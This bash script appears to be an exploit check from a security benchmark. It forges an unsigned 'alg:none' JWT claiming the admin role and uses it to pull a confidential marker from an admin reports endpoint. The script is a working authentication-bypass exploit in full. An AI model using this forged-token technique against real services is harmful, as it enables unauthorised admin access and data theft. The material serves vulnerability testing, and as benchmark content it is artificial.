#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
uid=$(user_id user1@bench.local)
token=$(python3 - "$uid" <<'PYJ'
import base64,json,sys
enc=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(",",":")).encode()).rstrip(b"=").decode()
print(enc({"alg":"none","typ":"JWT"})+"."+enc({"sub":int(sys.argv[1]),"role":"admin","email":"user1@bench.local"})+".")
PYJ
)
curl -s -H "Authorization: Bearer $token" "$TARGET/api/reports/admin-summary" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
